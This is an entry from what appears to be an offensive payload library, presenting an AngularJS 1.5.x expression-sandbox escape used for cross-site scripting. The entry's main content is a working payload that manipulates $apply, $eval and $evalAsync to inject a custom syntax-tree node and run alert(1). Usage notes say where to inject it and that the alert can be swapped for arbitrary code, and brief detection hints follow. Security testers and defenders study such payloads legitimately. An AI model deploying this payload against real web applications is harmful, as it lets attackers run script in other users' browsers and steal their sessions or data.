---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - angularjs
  - sandbox-bypass
platforms:
  - Web
validated: true
---

# AngularJS-15-Sandbox-AST-Bypass

## Code

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("\n    astNode=pop();astNode.type='UnaryExpression';\n    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\n    astNode.argument={type:'Identifier',name:'foo'};\n    ");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n}}
```

## Description

This complex payload bypasses the AngularJS 1.5.9-1.5.11 expression sandbox by manipulating $apply, $eval, and $evalAsync to inject a custom AST node that executes alert(1) conditionally.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Advanced payload; alert(1) can be replaced with arbitrary code. | N/A |

## Usage

Inject into scope variables in AngularJS 1.5.x apps for sandbox evasion during XSS testing.

## Detection

- Anomalous $evalAsync calls in AngularJS debug logs.
- AST manipulation traces in browser profilers.
- WAF blocks on substring.bind/apply patterns.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
